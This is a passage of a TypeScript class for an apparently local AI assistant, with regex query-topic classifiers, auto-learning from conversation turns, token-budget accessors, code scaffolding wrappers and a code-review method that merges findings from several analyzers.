    const operatorPattern = /\b(switchmap\s+(cancel|latest|observable)|combinlatest\s+(merge|zip|fork)|reactive\s+(operator|error|retry|circuit))\b/i
    return rxPattern.test(msg) || backpressurePattern.test(msg) || operatorPattern.test(msg)
  }

  private isMetaprogrammingQuery(msg: string): boolean {
    const reflectionPattern = /\b(runtime\s+reflection\s+(java|python|dotnet|inspect)|compile.?time\s+(metaprogramming|macro|template)|rust\s+macro\s+(procedural|derive|attribute|declarative))\b/i
    const astPattern = /\b(ast\s+manipulation\s+(babel|typescript|roslyn)|babel\s+plugin\s+(visitor|traverse|transform)|typescript\s+compiler\s+(api|transformer|checker))\b/i
    const aopPattern = /\b(aspect\s+oriented\s+(programming|aop|cross.cutting)|code\s+generation\s+(scaffold|yeoman|plop|template)|decorator\s+(pattern|python|typescript|annotation))\b/i
    return reflectionPattern.test(msg) || astPattern.test(msg) || aopPattern.test(msg)
  }

  private isMicroFrontendsQuery(msg: string): boolean {
    const federationPattern = /\b(module\s+federation\s+(webpack|import|dynamic|remote)|micro\s+frontend\s+(composition|server|edge|client)|import\s+map\s+(browser|systemjs|module))\b/i
    const spaPattern = /\b(single.?spa\s+(framework|parcel|application|root)|web\s+component\s+(micro|shadow|custom\s+element)|micro\s+frontend\s+(deploy|canary|blue.green|independent))\b/i
    const statePattern = /\b(shared\s+state\s+(management|custom\s+event|pub.sub)|cross.app\s+(communication|broadcast|postmessage)|micro\s+frontend\s+(shared|library|encapsulation))\b/i
    return federationPattern.test(msg) || spaPattern.test(msg) || statePattern.test(msg)
  }

  private isRefactoringPatternsQuery(msg: string): boolean {
    const smellPattern = /\b(code\s+smell\s+(long\s+method|god\s+class|feature\s+envy)|refactoring\s+technique\s+(extract|move|replace|inline)|extract\s+(method|class)\s+(srp|isolate|responsibility))\b/i
    const legacyPattern = /\b(legacy\s+code\s+(characterization|strangler|branch|seam)|strangler\s+fig\s+(pattern|migration|incremental)|technical\s+debt\s+(quadrant|impact|effort|sprint))\b/i
    const antiPattern = /\b(anti.?pattern\s+(spaghetti|golden\s+hammer|cargo\s+cult)|premature\s+optimization\s+(knuth|profile|root)|solid\s+principle\s+(srp|ocp|lsp|isp|dip))\b/i
    return smellPattern.test(msg) || legacyPattern.test(msg) || antiPattern.test(msg)
  }

  private isMLOpsEngineeringQuery(msg: string): boolean {
    const pipelinePattern = /\b(ml\s+pipeline\s+(kubeflow|mlflow|airflow|metaflow)|model\s+registry\s+(mlflow|versioning|staging|ab\s+testing)|feature\s+store\s+(feast|tecton|hopsworks|online))\b/i
    const versionPattern = /\b(data\s+versioning\s+(dvc|delta\s+lake|lakefs|lineage)|experiment\s+tracking\s+(mlflow|weights|biases|neptune)|hyperparameter\s+(tuning|optuna|hyperopt|bayesian))\b/i
    const monitorPattern = /\b(model\s+monitoring\s+(drift|performance|retraining)|data\s+drift\s+(detection|kl|psi|kolmogorov)|concept\s+drift\s+(feature|target|distribution))\b/i
    return pipelinePattern.test(msg) || versionPattern.test(msg) || monitorPattern.test(msg)
  }

  private isAdvancedTestingQuery(msg: string): boolean {
    const propPattern = /\b(property.?based\s+testing\s+(quickcheck|hypothesis|fast.check)|mutation\s+testing\s+(pit|stryker|mutant|score)|fuzz\s+testing\s+(afl|libfuzzer|coverage|corpus))\b/i
    const contractPattern = /\b(contract\s+testing\s+(pact|spring|consumer|provider)|consumer.?driven\s+(contract|pact|verification)|formal\s+specification\s+(tla\+?|alloy|z\s+notation|model\s+checking))\b/i
    const chaosTestPattern = /\b(chaos\s+testing\s+(integration|fault|toxiproxy|resilience)|resilience\s+testing\s+(pattern|circuit|retry|bulkhead)|fault\s+injection\s+(test|deterministic|simulation))\b/i
    return propPattern.test(msg) || contractPattern.test(msg) || chaosTestPattern.test(msg)
  }

  private isAPIDesignPatternsQuery(msg: string): boolean {
    const restPattern = /\b(rest\s+best\s+practices\s+(resource|http|status|hateoas)|graphql\s+schema\s+(design|resolvers|subscriptions|federation)|api\s+gateway\s+(rate\s+limiting|authentication|load\s+balancing|circuit))\b/i
    const versionDocPattern = /\b(api\s+versioning\s+(strategies|url|header|query|content)|api\s+documentation\s+(openapi|swagger|asyncapi|blueprint)|openapi\s+(specification|swagger|redoc|generator))\b/i
    const webhookPattern = /\b(webhook\s+design\s+(delivery|retry|signature|idempotency)|webhook\s+(security|payload|event|endpoint)|hateoas\s+(hypermedia|links|hal|json.api))\b/i
    return restPattern.test(msg) || versionDocPattern.test(msg) || webhookPattern.test(msg)
  }

  private isDatabaseInternalsQuery(msg: string): boolean {
    const storagePattern = /\b(storage\s+engines?\s+(b.tree|lsm|page|log.structured)|b.tree\s+(balanced|node|splitting|page)|lsm.tree\s+(compaction|memtable|sstable|leveled))\b/i
    const queryOptPattern = /\b(query\s+optimization\s+(cost|join|index|plan)|cost.based\s+optimizer\s+(statistics|cardinality|histogram)|transaction\s+isolation\s+(read|repeatable|serializable|mvcc))\b/i
    const walPattern = /\b(consensus\s+algorithms?\s+(raft|paxos|pbft|leader)|write.ahead\s+logging\s+(wal|checkpoint|recovery|aries)|indexing\s+strategies\s+(b\+|hash|bitmap|gin|gist))\b/i
    return storagePattern.test(msg) || queryOptPattern.test(msg) || walPattern.test(msg)
  }

  private isFunctionalDeepQuery(msg: string): boolean {
    const monadPattern = /\b(monads?\s+(functors?|maybe|option|either|result|io|state|reader|writer)|algebraic\s+data\s+types?\s+(sum|product|pattern|exhaustive)|pattern\s+matching\s+(exhaustive|destructuring|guard|wildcard))\b/i
    const typeClassPattern = /\b(type\s+class(es)?\s+(haskell|rust|scala|trait|implicit)|immutable\s+data\s+structures?\s+(persistent|hamt|finger|zipper)|persistent\s+(vectors?|data|structural\s+sharing))\b/i
    const effectPattern = /\b(effect\s+systems?\s+(algebraic|zio|cats|free)|algebraic\s+effects?\s+(handler|resumable|koka)|category\s+theory\s+(functors?|natural|kleisli|yoneda))\b/i
    return monadPattern.test(msg) || typeClassPattern.test(msg) || effectPattern.test(msg)
  }

  private isSystemsProgrammingQuery(msg: string): boolean {
    const memPattern = /\b(memory\s+management\s+(stack|heap|malloc|raii|smart\s+pointer)|cpu\s+architecture\s+(cache|branch|simd|sse|avx|memory\s+ordering)|cache\s+lines?\s+(spatial|false\s+sharing|alignment))\b/i
    const linkerPattern = /\b(linkers?\s+(loaders?|elf|dynamic|symbol|plt|got)|system\s+calls?\s+(syscall|file\s+descriptors?|mmap|epoll|kqueue|io_uring)|elf\s+format\s+(sections?|headers?|symbol))\b/i
    const unsafePattern = /\b(unsafe\s+code\s+(ffi|rust|interop|jni|ctypes|wasm)|binary\s+protocols?\s+(endianness|serialization|protobuf|flatbuffers|cap.n.proto)|foreign\s+function\s+(interface|interop|binding))\b/i
    return memPattern.test(msg) || linkerPattern.test(msg) || unsafePattern.test(msg)
  }

  private isDeveloperProductivityQuery(msg: string): boolean {
    const idePattern = /\b(ide\s+(editor|mastery|extensions?|plugins?)|vs\s+code\s+(extensions?|plugins?|remote|copilot)|vim\s+(neovim|config|modal|treesitter|lsp))\b/i
    const debugPattern = /\b(debugging\s+techniques?\s+(conditional|breakpoint|watchpoint|remote|core\s+dump)|profiling\s+tools?\s+(cpu|memory|flame\s+graph|async|ebpf)|flame\s+graphs?\s+(brendan|gregg|speedscope|visualization))\b/i
    const cliPattern = /\b(code\s+navigation\s+(intelligence|symbol|call|hierarchy)|cli\s+tools?\s+(ripgrep|fd|jq|fzf|tmux|zoxide|bat)|dev(elopment)?\s+environments?\s+(devcontainer|nix|dotfiles|codespace))\b/i
    return idePattern.test(msg) || debugPattern.test(msg) || cliPattern.test(msg)
  }

  private isCodeReviewPracticesQuery(msg: string): boolean {
    const checklistPattern = /\b(review\s+checklist\s+(correctness|readability|performance|security|tests)|review\s+techniques?\s+(line.by.line|architecture|security|nitpick|blocking)|code\s+review\s+(best\s+practices?|checklist|techniques?))\b/i
    const feedbackPattern = /\b(giving\s+feedback\s+(constructive|criticism|praise|questions|alternatives)|common\s+review\s+issues?\s+(magic\s+numbers?|naming|error|race\s+condition)|review\s+feedback\s+(constructive|blocking|nitpick))\b/i
    const prPattern = /\b(automated\s+review\s+(tools?|linters?|sonarqube|codeclimate|codacy)|pr\s+strategies\s+(small|stacked|draft|review\s+rounds|merge)|pull\s+request\s+(strategies|review|small|stacked|draft))\b/i
    return checklistPattern.test(msg) || feedbackPattern.test(msg) || prPattern.test(msg)
  }

  private isCleanCodeQuery(msg: string): boolean {
    const namingPattern = /\b(naming\s+conventions?\s+(meaningful|abbreviations?|domain|vocabulary)|function\s+design\s+(single\s+responsibility|small|pure|minimal|parameters?)|clean\s+code\s+(principles?|naming|functions?|design))\b/i
    const errorPattern = /\b(error\s+handling\s+patterns?\s+(fail\s+fast|hierarchy|result|sentinel)|code\s+organization\s+(cohesion|coupling|package.by.feature|layered|screaming)|screaming\s+architecture\s+(domain|folders?|structure))\b/i
    const testPyramidPattern = /\b(comments?\s+(documentation|self.documenting|jsdoc|tsdoc|readme.driven)|testing\s+pyramid\s+(unit|integration|e2e|contract|acceptance|trophy)|testing\s+trophy\s+(kent|dodds|integration|static))\b/i
    return namingPattern.test(msg) || errorPattern.test(msg) || testPyramidPattern.test(msg)
  }

  private isVersionControlAdvancedQuery(msg: string): boolean {
    const gitInternalsPattern = /\b(git\s+internals?\s+(objects?|refs?|packfiles?|reflog|dag)|branching\s+strategies\s+(git\s+flow|github\s+flow|trunk.based|release)|trunk.based\s+development\s+(feature\s+flags?|short.lived|ci.cd))\b/i
    const rebasePattern = /\b(rebase\s+vs\s+merge\s+(interactive|squash|fixup|autosquash)|interactive\s+rebase\s+(reorder|edit|squash|drop|fixup)|git\s+rebase\s+(interactive|onto|squash|fixup))\b/i
    const hooksPattern = /\b(git\s+hooks?\s+(pre.commit|commit.msg|pre.push|husky|lint.staged)|monorepo\s+management\s+(nx|turborepo|lerna|workspace|affected)|conflict\s+resolution\s+(merge|ours|theirs|rerere|octopus|three.way))\b/i
    return gitInternalsPattern.test(msg) || rebasePattern.test(msg) || hooksPattern.test(msg)
  }

  private isConversationalAIQuery(msg: string): boolean {
    const dialoguePattern = /\b(conversational\s+ai\s+(chatbot|dialogue|virtual\s+assistant|system)|dialogue\s+(management|state\s+tracking|slot\s+filling|policy|system)|chatbot\s+(design|architecture|framework|development))\b/i
    const intentPattern = /\b(intent\s+(recognition|classification|detection)\s+(nlu|bert|training)|entity\s+extraction\s+(ner|slot|named|recognition)|conversation\s+(context|memory|history|flow|management|multi.turn))\b/i
    const responsePattern = /\b(response\s+generation\s+(template|retrieval|generative|grounded)|dialogue\s+act\s+(recognition|classification|type)|open.domain\s+(chatbot|chitchat|social\s+bot|dialogue))\b/i
    return dialoguePattern.test(msg) || intentPattern.test(msg) || responsePattern.test(msg)
  }

  private isNLUQuery(msg: string): boolean {
    const nluPattern = /\b(natural\s+language\s+understanding\s+(nlu|semantic|parsing|meaning)|word\s+embedding\s+(word2vec|glove|fasttext|bert|contextual)|semantic\s+(role\s+labeling|parsing|similarity|representation))\b/i
    const taskPattern = /\b(text\s+classification\s+(sentiment|topic|spam|toxicity)|relation\s+extraction\s+(knowledge|information|triple)|question\s+answering\s+(extractive|abstractive|open.domain|reading))\b/i
    const advancedPattern = /\b(coreference\s+resolution\s+(anaphora|pronoun|mention|entity)|discourse\s+(parsing|coherence|structure|rhetorical)|pragmatics\s+(implicature|presupposition|speech\s+act|context))\b/i
    return nluPattern.test(msg) || taskPattern.test(msg) || advancedPattern.test(msg)
  }

  private isKnowledgeGraphQuery(msg: string): boolean {
    const kgPattern = /\b(knowledge\s+graph\s+(ontology|triple|rdf|owl|sparql|embedding)|knowledge\s+representation\s+(reasoning|semantic\s+web|linked\s+data)|ontology\s+(design|class|hierarchy|property|axiom))\b/i
    const reasoningPattern = /\b(reasoning\s+(inference|rule|forward\s+chaining|backward)|commonsense\s+(knowledge|reasoning|understanding)|entity\s+(linking|disambiguation|resolution|normalization))\b/i
    const gnnPattern = /\b(graph\s+neural\s+network\s+(gnn|knowledge|embedding)|knowledge\s+(fusion|integration|alignment|merging)|temporal\s+knowledge\s+graph\s+(time|event|temporal))\b/i
    return kgPattern.test(msg) || reasoningPattern.test(msg) || gnnPattern.test(msg)
  }

  private isCognitiveScienceQuery(msg: string): boolean {
    const cogPattern = /\b(cognitive\s+science\s+(cognition|perception|attention|memory|learning)|working\s+memory\s+(short\s+term|long\s+term|episodic|semantic|procedural)|cognitive\s+load\s+(theory|schema|automation|chunking|dual))\b/i
    const mentalPattern = /\b(mental\s+model\s+(schema|frame|script|knowledge)|metacognition\s+(self.regulation|thinking|monitoring|calibration)|cognitive\s+bias\s+(heuristic|anchoring|confirmation|availability))\b/i
    const learningPattern = /\b(learning\s+theory\s+(constructivism|scaffolding|zone|proximal)|transfer\s+(learning|analogy|abstraction|generalization)|distributed\s+cognition\s+(embodied|situated|extended\s+mind))\b/i
    return cogPattern.test(msg) || mentalPattern.test(msg) || learningPattern.test(msg)
  }

  private isInformationRetrievalQuery(msg: string): boolean {
    const irPattern = /\b(information\s+retrieval\s+(search|indexing|ranking|relevance)|tf.idf\s+(bm25|vector|semantic|embedding|search)|inverted\s+index\s+(posting|document|term\s+frequency))\b/i
    const queryPattern = /\b(query\s+(expansion|reformulation|relevance\s+feedback)|learning\s+to\s+rank\s+(feature|pairwise|listwise)|faceted\s+search\s+(filtering|autocomplete|suggestion))\b/i
    const ragPattern = /\b(rag\s+(retrieval|augmented|generation|context)|document\s+chunking\s+(passage|retrieval|context\s+window)|search\s+(index|elasticsearch|solr|lucene|meilisearch|typesense))\b/i
    return irPattern.test(msg) || queryPattern.test(msg) || ragPattern.test(msg)
  }

  private isPragmaticsQuery(msg: string): boolean {
    const pragPattern = /\b(pragmatics\s+(discourse|conversation|speech\s+act|analysis)|grice\s+(maxims?|cooperative\s+principle|implicature)|turn\s+taking\s+(adjacency|conversation|interaction))\b/i
    const meaningPattern = /\b(presupposition\s+(entailment|inference|pragmatic)|politeness\s+(theory|face|positive|negative|indirect)|context\s+(disambiguation|reference\s+resolution|deixis|anaphora))\b/i
    const structPattern = /\b(coherence\s+(cohesion|discourse\s+markers?|connectives|text)|narrative\s+structure\s+(story\s+grammar|episode|schema)|argumentation\s+(logic|claim|evidence|warrant|rebuttal|toulmin))\b/i
    return pragPattern.test(msg) || meaningPattern.test(msg) || structPattern.test(msg)
  }

  private isForexAnalysisQuery(msg: string): boolean {
    const forexPattern = /\b(forex\s+(market\s+analysis|currency\s+pair|session|fundamental|correlation)|currency\s+(pair|major|minor|exotic|correlation)|carry\s+trade\s+(swap|interest|yield))\b/i
    const centralBankPattern = /\b(central\s+bank\s+(monetary\s+policy|rate\s+decision|hawkish|dovish)|economic\s+(indicator|calendar|event)\s+(nfp|cpi|gdp|fomc|pmi)|interest\s+rate\s+decision\s+(fed|ecb|boj|boe))\b/i
    const intermarketPattern = /\b(intermarket\s+analysis\s+(bonds?|commodit|stocks?|indices|correlation)|dxy\s+(dollar\s+index|basket|weighted)|cot\s+report\s+(commitment|traders?|positioning))\b/i
    return forexPattern.test(msg) || centralBankPattern.test(msg) || intermarketPattern.test(msg)
  }

  private isTechnicalAnalysisDeepQuery(msg: string): boolean {
    const elliottPattern = /\b(elliott\s+wave\s+(theory|impulse|corrective|count)|ichimoku\s+(cloud|kinko\s+hyo|tenkan|kijun|senkou|chikou)|fibonacci\s+(retracement|extension|golden\s+ratio|0\.618|0\.382|1\.618))\b/i
    const smcPattern = /\b(supply\s+demand\s+zone\s+(order\s+block|smart\s+money|institutional)|harmonic\s+pattern\s+(gartley|butterfly|bat|crab|abcd)|volume\s+profile\s+(point\s+of\s+control|value\s+area|market\s+profile))\b/i
    const wyckoffPattern = /\b(wyckoff\s+(method|accumulation|distribution|spring|upthrust)|pivot\s+points?\s+(camarilla|fibonacci|woodie|floor)|divergence\s+(hidden|regular|rsi|macd|stochastic))\b/i
    return elliottPattern.test(msg) || smcPattern.test(msg) || wyckoffPattern.test(msg)
  }

  private isCryptoTradingQuery(msg: string): boolean {
    const cryptoPattern = /\b(cryptocurrency\s+trading\s+(bitcoin|ethereum|altcoin|blockchain)|defi\s+(decentralized\s+finance|yield\s+farming|liquidity\s+pool|amm)|crypto\s+exchange\s+(cex|dex|order\s+book|perpetual))\b/i
    const onChainPattern = /\b(on.chain\s+analysis\s+(blockchain|metrics?|whale|transaction)|tokenomics\s+(supply|vesting|inflation|deflation)|nft\s+(non.fungible|mint|marketplace|collection|trading))\b/i
    const cryptoRiskPattern = /\b(crypto\s+(risk\s+management|leverage|liquidation|funding\s+rate)|bitcoin\s+halving\s+(cycle|altcoin\s+season|dominance)|stablecoin\s+(usdt|usdc|dai|peg|mechanism))\b/i
    return cryptoPattern.test(msg) || onChainPattern.test(msg) || cryptoRiskPattern.test(msg)
  }

  private isOptionsDerivativesQuery(msg: string): boolean {
    const optionsPattern = /\b(options?\s+trading\s+(call|put|strike|premium|expiration)|options?\s+greeks?\s+(delta|gamma|theta|vega|rho)|options?\s+strateg(y|ies)\s+(covered\s+call|protective\s+put|iron\s+condor|spread))\b/i
    const pricingPattern = /\b(black.scholes\s+(model|formula|pricing)|implied\s+volatility\s+(skew|smile|crush|iv)|futures?\s+contract\s+(margin|maintenance|mark.to.market))\b/i
    const advancedPattern = /\b(options?\s+(straddle|strangle|butterfly|calendar|diagonal)|derivatives?\s+(swap|interest\s+rate|credit\s+default|forward)|options?\s+volatility\s+trading\s+(iv|crush|earnings))\b/i
    return optionsPattern.test(msg) || pricingPattern.test(msg) || advancedPattern.test(msg)
  }

  private isQuantitativeTradingQuery(msg: string): boolean {
    const quantPattern = /\b(quantitative\s+trading\s+(strategy|alpha|signal|factor)|statistical\s+arbitrage\s+(pairs?\s+trading|cointegration|mean\s+reversion)|backtesting\s+(framework|walk.forward|overfitting|cross.validation))\b/i
    const executionPattern = /\b(market\s+making\s+(high\s+frequency|low\s+latency|colocation)|execution\s+algorithm\s+(twap|vwap|implementation\s+shortfall|iceberg)|risk\s+model\s+(value\s+at\s+risk|var|expected\s+shortfall|monte\s+carlo))\b/i
    const mlPattern = /\b(machine\s+learning\s+trading\s+(feature|prediction|model)|alternative\s+data\s+(sentiment|satellite|social\s+media|trading)|portfolio\s+optimization\s+(mean.variance|efficient\s+frontier|sharpe))\b/i
    return quantPattern.test(msg) || executionPattern.test(msg) || mlPattern.test(msg)
  }

  private isTradingPsychologyQuery(msg: string): boolean {
    const psychPattern = /\b(trading\s+psychology\s+(emotional|discipline|fear|greed|bias)|trading\s+mindset\s+(patience|consistency|routine|journal)|cognitive\s+bias\s+(overconfidence|loss\s+aversion|recency|anchoring))\b/i
    const riskPsychPattern = /\b(risk\s+management\s+position\s+sizing\s+(percent|fixed|fractional)|trading\s+plan\s+(rules|entry|exit|criteria|checklist)|trading\s+performance\s+(metrics?|win\s+rate|risk\s+reward|expectancy))\b/i
    const adaptPattern = /\b(market\s+regime\s+(trend|range|volatile|quiet|adapting)|trading\s+mistakes?\s+(revenge|overtrading|moving\s+stop)|professional\s+trader\s+(habits?|screen\s+time|deliberate\s+practice|edge))\b/i
    return psychPattern.test(msg) || riskPsychPattern.test(msg) || adaptPattern.test(msg)
  }

  private isMarketMicrostructureQuery(msg: string): boolean {
    const orderBookPattern = /\b(order\s+book\s+(depth|bid|ask|spread|market\s+maker|liquidity)|order\s+flow\s+(tape\s+reading|level\s+2|time\s+and\s+sales|footprint)|market\s+impact\s+(slippage|execution\s+quality|fill\s+rate))\b/i
    const venuePattern = /\b(market\s+(structure|venue)\s+(exchange|dark\s+pool|alternative)|auction\s+mechanism\s+(opening|closing|price\s+discovery|continuous)|order\s+routing\s+(smart|execution|best\s+execution|regulation))\b/i
    const hftPattern = /\b(high\s+frequency\s+trading\s+(latency|arbitrage|flash\s+crash)|market\s+manipulation\s+(spoofing|layering|wash\s+trading|pump)|electronic\s+market\s+making\s+(spread|capture|inventory))\b/i
    return orderBookPattern.test(msg) || venuePattern.test(msg) || hftPattern.test(msg)
  }

  private isPortfolioManagementQuery(msg: string): boolean {
    const allocationPattern = /\b(portfolio\s+management\s+(asset\s+allocation|strategic|tactical|dynamic)|modern\s+portfolio\s+theory\s+(markowitz|efficient\s+frontier|diversification)|rebalancing\s+(portfolio|drift|threshold|calendar|tax\s+loss))\b/i
    const strategyPattern = /\b(risk\s+parity\s+(all\s+weather|permanent\s+portfolio|equal\s+weight)|factor\s+investing\s+(smart\s+beta|momentum|value|quality|size)|etf\s+(exchange\s+traded|index\s+fund|passive\s+investing))\b/i
    const advancedPattern = /\b(hedge\s+fund\s+strateg(y|ies)\s+(long.short|global\s+macro|event.driven)|portfolio\s+performance\s+(attribution|benchmark|alpha|tracking\s+error)|wealth\s+management\s+(financial\s+planning|retirement|income|tax))\b/i
    return allocationPattern.test(msg) || strategyPattern.test(msg) || advancedPattern.test(msg)
  }

  private isAIToolkitImageGenQuery(msg: string): boolean {
    const imageGenPattern = /\b(image\s+generat(ion|e|ing)|text.to.image|diffusion\s+model\s+(generat|image|train)|ai\s+toolkit\s+(image|generat|train|lora)|flux\s+(image|generat|model|train|lora))\b/i
    const loraPattern = /\b(lora\s+(train|fine.tun|rank|adapt|custom)|fine.tun(e|ing)\s+(diffusion|model|image|lora)|dreambooth\s+(train|concept|custom))\b/i
    const videoGenPattern = /\b(video\s+generat(ion|e|ing)|text.to.video|image.to.video|wan\s+2\.[12]\s+(video|generat|model)|ltx.2\s+(video|generat))\b/i
    const editPattern = /\b(image\s+edit(ing)?\s+(model|ai|instruction|flux|kontext|qwen)|flux\s+kontext\s+(edit|model|instruct)|instruction.based\s+edit(ing)?)\b/i
    return imageGenPattern.test(msg) || loraPattern.test(msg) || videoGenPattern.test(msg) || editPattern.test(msg)
  }

  /** Extract probable cause from a causal query. */
  private extractCause(msg: string): string {
    const match = msg.match(/why\s+(?:does?|is|are|did|would|can)\s+(.+?)(?:\?|$)/i)
    return match?.[1]?.trim() ?? msg.split(/\s+/).slice(0, 5).join(' ')
  }

  /** Extract probable effect from a causal query. */
  private extractEffect(msg: string): string {
    const match = msg.match(/(?:causes?|leads?\s+to|results?\s+in)\s+(.+?)(?:\?|$)/i)
    return match?.[1]?.trim() ?? msg.split(/\s+/).slice(-5).join(' ')
  }

  // ── Auto-Learning Helpers ──────────────────────────────────────────────────

  /**
   * Auto-learn from conversation turns:
   * - Reinforce patterns from high-scoring KB matches
   * - Track rephrase signals (implicit negative feedback)
   * - Trigger generalization after enough similar patterns
   */
  private autoLearnFromConversation(
    userMessage: string,
    response: string,
    knowledgeResults: KnowledgeSearchResult[],
    _confidence: number,
  ): void {
    // Auto-reinforce from strong KB matches (only for non-trivial messages)
    if (knowledgeResults.length > 0 && knowledgeResults[0]!.score >= 3 && userMessage.trim().split(/\s+/).length >= 3) {
      this.learn(userMessage, response, 'reinforced')
    }

    // Detect rephrase: if user asks something very similar to a recent question,
    // treat it as implicit "didn't understand" signal and slightly reduce confidence
    if (this.conversationHistory.length >= 4) {
      const prevUserMsgs = this.conversationHistory
        .filter(m => m.role === 'user')
        .slice(-3)
        .map(m => typeof m.content === 'string' ? m.content : '')
      const currentKw = new Set(extractKeywords(userMessage))
      for (const prev of prevUserMsgs) {
        if (prev === userMessage) continue
        const prevKw = extractKeywords(prev)
        const overlap = prevKw.filter(k => currentKw.has(k)).length
        if (prevKw.length > 0 && overlap / prevKw.length > 0.7) {
          // High keyword overlap → rephrase detected → reduce pattern confidence
          const match = this.learnedPatterns.find(p => p.inputPattern.toLowerCase() === prev.toLowerCase())
          if (match && match.confidence > 0.2) {
            match.confidence = Math.max(0.1, match.confidence - 0.1)
          }
          break
        }
      }
    }

    // Auto-generalization: when enough similar patterns exist in a category
    if (this.adaptiveLearner && this.learnedPatterns.length > 0) {
      const categoryCounts = new Map<string, number>()
      for (const p of this.learnedPatterns) {
        categoryCounts.set(p.category, (categoryCounts.get(p.category) ?? 0) + 1)
      }
      for (const [category, count] of categoryCounts) {
        if (count >= 5 && count % 5 === 0) {
          // Trigger generalization for this category
          try {
            const examples = this.learnedPatterns
              .filter(p => p.category === category)
              .slice(0, 10)
              .map(p => ({
                input: p.inputPattern,
                output: p.response,
                label: p.category,
              }))
            this.adaptiveLearner.generalize(examples)
          } catch { /* non-critical */ }
        }
      }
    }
  }

  /** Get budget-related fields for the response. */
  private getBudgetFields(): {
    budgetWarning?: boolean
    budgetExhausted?: boolean
    remainingTokens?: number
    usagePercent?: number
  } {
    if (!this.tokenBudget.enabled) return {}
    const report = this.tokenBudget.getReport()
    return {
      budgetWarning: report.budgetWarning || undefined,
      budgetExhausted: report.budgetExhausted || undefined,
      remainingTokens: report.remainingTokens,
      usagePercent: report.usagePercent,
    }
  }

  // ── Token Budget API ──────────────────────────────────────────────────────

  /** Get the current token budget report. */
  getTokenBudget(): BudgetReport {
    return this.tokenBudget.getReport()
  }

  // ── Code Writing (same interface as AiBrain.writeCode) ──

  /** Generate code locally using templates and pattern matching. */
  async writeCode(request: CodeRequest): Promise<CodeResult> {
    this.stats.totalCodeGenerations++
    this.stats.lastUsedAt = new Date().toISOString()
    return generateCodeLocally(request)
  }

  // ── Smart Coding Agent — Engineer-like file creation and project scaffolding ──

  /**
   * Scaffold a complete project with files, configs, tests, and directory structure.
   * Works like a smart engineer creating a project from scratch.
   */
  scaffoldProject(name: string, template: ProjectTemplate, language?: ScaffoldLanguage): ScaffoldResult {
    this.stats.totalCodeGenerations++
    this.stats.lastUsedAt = new Date().toISOString()
    return this.codeAgent.scaffold(name, template, language)
  }

  /**
   * Create a single file with smart code generation.
   * Detects file type from path, generates imports/exports, links to existing files.
   */
  smartCreateFile(request: CreateFileRequest): CreateFileResult {
    this.stats.totalCodeGenerations++
    this.stats.lastUsedAt = new Date().toISOString()
    return this.codeAgent.createFile(request)
  }

  /**
   * Add code to an existing file at the specified position.
   * Intelligently detects where to place new code.
   */
  smartAddToFile(request: AddToFileRequest): AddToFileResult {
    this.stats.totalCodeGenerations++
    this.stats.lastUsedAt = new Date().toISOString()
    return this.codeAgent.addToFile(request)
  }

  /**
   * Add an export statement for a symbol in a file.
   * Handles named exports, default exports, and language-specific patterns.
   */
  smartAddExport(request: ExportFromFileRequest): string {
    this.stats.lastUsedAt = new Date().toISOString()
    return this.codeAgent.addExport(request)
  }

  /** Get available project templates. */
  getProjectTemplates(): ProjectTemplate[] {
    return this.codeAgent.getTemplates()
  }

  // ── Code Review (enhanced with CodeMaster deep analysis) ──

  /**
   * Review code using CodeMaster's deep analysis pipeline.
   * Combines rule-based static analysis with CodeAnalyzer + CodeReviewer
   * for more thorough bug detection, security scanning, and auto-fix suggestions.
   */
  async reviewCode(request: CodeReviewRequest): Promise<CodeReviewResult> {
    this.stats.totalCodeReviews++
    this.stats.lastUsedAt = new Date().toISOString()

    // Get base review from local rules
    const baseReview = reviewCodeLocally(request)

    // Enhance with CodeMaster deep analysis
    const lang = request.language as AnalysisLanguage
    const cmReview = this.codeReviewer.review(request.code, lang)

    // Merge CodeMaster findings into base issues (avoiding duplicates)
    const existingMessages = new Set(baseReview.issues.map(i => i.message.toLowerCase()))
    for (const finding of cmReview.findings) {
      const msg = finding.title.toLowerCase()
      if (!existingMessages.has(msg)) {
        existingMessages.add(msg)
        const severity = finding.severity === 'critical' || finding.severity === 'high'
          ? 'error' as const
          : finding.severity === 'medium'
            ? 'warning' as const
            : 'info' as const
        baseReview.issues.push({
          severity,
          line: finding.line,
          message: finding.title,
          suggestion: finding.suggestion,
        })
      }
    }

    // Generate auto-fix if issues found
    if (baseReview.issues.length > 0) {
      const fixResult = this.codeFixer.fixCode(request.code, lang, cmReview.findings)
      if (fixResult.summary.applied > 0) {
        const fixedCode = this.codeFixer.applyFixes(
          request.code,
          fixResult.fixes.filter(f => f.applied),
        )
        baseReview.improvedCode = fixedCode.code
      }
    }

    // Enhance with new CodeMaster analyzers: performance, type safety, async flow
    const perfResult = this.performanceAnalyzer.analyze(request.code)
    for (const issue of perfResult.issues) {
      const msg = issue.title.toLowerCase()
      if (!existingMessages.has(msg)) {
        existingMessages.add(msg)
        baseReview.issues.push({
          severity: issue.severity === 'critical' || issue.severity === 'high' ? 'warning' as const : 'info' as const,
          line: issue.line,
          message: `[Performance] ${issue.title}`,
          suggestion: issue.suggestion,
        })
      }
    }

    const asyncResult = this.asyncFlowAnalyzer.analyze(request.code)
    for (const issue of asyncResult.issues) {
      const msg = issue.title.toLowerCase()
      if (!existingMessages.has(msg)) {
        existingMessages.add(msg)
        baseReview.issues.push({
          severity: issue.severity === 'critical' || issue.severity === 'high' ? 'error' as const : 'warning' as const,
          line: issue.line,
          message: `[Async] ${issue.title}`,
          suggestion: issue.suggestion,
        })
      }
    }

    if (lang === 'typescript' || lang === 'javascript') {
      const typeResult = this.typeFlowAnalyzer.analyze(request.code)
      for (const issue of typeResult.issues) {
        const msg = issue.title.toLowerCase()
        if (!existingMessages.has(msg)) {
          existingMessages.add(msg)
          baseReview.issues.push({
            severity: issue.severity === 'critical' || issue.severity === 'high' ? 'warning' as const : 'info' as const,
            line: issue.line,
            message: `[TypeSafety] ${issue.title}`,
            suggestion: issue.suggestion,
          })
        }
      }
    }

    // Use the lower (stricter) of the two scores
    baseReview.score = Math.min(baseReview.score, cmReview.overallScore)

    // Learn from this review for future improvement
    if (this.config.learningEnabled) {
      this.codeLearningEngine.learnFromReviewBatch(request.code, lang, cmReview.findings)
    }

    // Recalculate summary
    const errorCount = baseReview.issues.filter(i => i.severity === 'error').length
    const warningCount = baseReview.issues.filter(i => i.severity === 'warning').length
    const infoCount = baseReview.issues.filter(i => i.severity === 'info').length
    baseReview.summary = baseReview.issues.length === 0
      ? 'Code looks clean! No significant issues found.'
